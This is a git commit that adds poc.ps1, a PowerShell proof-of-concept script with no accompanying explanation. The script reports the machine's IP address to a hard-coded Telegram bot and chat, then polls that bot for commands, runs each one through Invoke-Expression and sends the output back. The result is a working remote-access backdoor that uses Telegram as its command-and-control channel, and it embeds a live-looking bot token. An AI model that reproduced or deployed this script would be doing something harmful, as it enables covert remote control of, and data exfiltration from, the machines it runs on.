04586f255b9ddc3232314baa4d918d1f0f1475d4
Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
2018-08-13 13:43:18 +0200

    Add files via upload

---
+++ poc.ps1
@@ -0,0 +1,120 @@
+﻿############
+## CONFIG ##
+############
+
+$BotToken = "688087783:AAGT_3LMrnPPnym-RIkrfSIWbiEZaTL_f_4"
+$ChatID = '-242346194'
+
+
+##########################
+## CONNECT WITH CHANNEL ##
+##########################
+
+$ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address
+$ipV4 = $ipV4.IPAddressToString
+
+if($nopreview) { $preview_mode = "True" }
+if($markdown) { $markdown_mode = "Markdown" } else {$markdown_mode = ""}
+
+$payload = @{
+    "chat_id" = $ChatID;
+    "text" = $ipV4;
+    "parse_mode" = $markdown_mode;
+    "disable_web_page_preview" = $preview_mode;
+}
+Invoke-WebRequest `
+    -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
+    -Method Post `
+    -ContentType "application/json;charset=utf-8" `
+    -Body (ConvertTo-Json -Compress -InputObject $payload)
+
+
+######################
+## WAIT FOR COMMAND ##
+######################
+
+# /select <IP> whoami
+
+#Time to sleep for each loop before checking if a message with the magic word was received
+$LoopSleep = 3
+ 
+ 
+#Get the Last Message Time at the beginning of the script:When the script is ran the first time, it will ignore any last message received!
+$BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
+$BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
+$LastMessageTime_Origin = $BotUpdatesResults[$BotUpdatesResults.Count-1].message.date
+ 
+#Read the responses in a while cycle
+$DoNotExit = 1
+#$PreviousLoop_LastMessageTime is going to be updated at every cycle (if the last message date changes)
+$PreviousLoop_LastMessageTime = $LastMessageTime_Origin
+ 
+$SleepStartTime = [Float] (get-date -UFormat %s) #This will be used to check if the $SleepTime has passed yet before sending a new notification out
+While ($DoNotExit)  {
+ 
+  Sleep -Seconds $LoopSleep
+  #Reset variables that might be dirty from the previous cycle
+  $LastMessageText = ""
+  $CommandToRun = ""
+  $CommandToRun_Result = ""
+  $CommandToRun_SimplifiedOutput = ""
+  $Message = ""
+  
+  #Get the current Bot Updates and store them in an array format to make it easier
+  $BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
+  $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
+  
+  #Get just the last message:
+  $LastMessage = $BotUpdatesResults[$BotUpdatesResults.Count-1]
+  #Get the last message time
+  $LastMessageTime = $LastMessage.message.date
+  
+  #If the $LastMessageTime is newer than $PreviousLoop_LastMessageTime, then the user has typed something!
+  If ($LastMessageTime -gt $PreviousLoop_LastMessageTime)  {
+    #Looks like there's a new message!
+    
+	#Update $PreviousLoop_LastMessageTime with the time from the latest message
+	$PreviousLoop_LastMessageTime = $LastMessageTime
+	#Update the LastMessageTime
+	$LastMessageTime = $LastMessage.Message.Date
+	#Update the $LastMessageText
+	$LastMessageText = $LastMessage.Message.Text
+	
+	Switch -Wildcard ($LastMessageText)  {
+	  "/select $ipV4 *"  { #Important: run with a space
+	    #The user wants to run a command
+		$CommandToRun = ($LastMessageText -split ("/select $ipV4 "))[1] #This will remove "run "
+		$Message = "Ok $($LastMessage.Message.from.first_name), I will try to run the following command: `n<b>$($CommandToRun)</b>"
+		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
+		
+		#Run the command
+		Try {
+		  Invoke-Expression $CommandToRun | Out-String | %  {
+		    $CommandToRun_Result += "`n $($_)"
+		  }
+		}
+		Catch  {
+		  $CommandToRun_Result = $_.Exception.Message
+		}
+ 
+		
+		$Message = "$($LastMessage.Message.from.first_name), I've ran <b>$($CommandToRun)</b> and this is the output:`n$CommandToRun_Result"
+		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
+	  }
+	  "quit_script"  {
+		#The user wants to stop the script
+		write-host "The script will end in 5 seconds"
+		$ExitMessage = "$($LastMessage.Message.from.first_name) has requested the script to be terminated. It will need to be started again in order to accept new messages!"
+		$ExitRestResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ExitMessage)&parse_mode=html"
+		Sleep -seconds 5
+		$DoNotExit = 0
+	  }
+	  default  {
+	    #The message sent is unknown
+		$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
+		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
+	  }
+	}
+	
+  }
+}
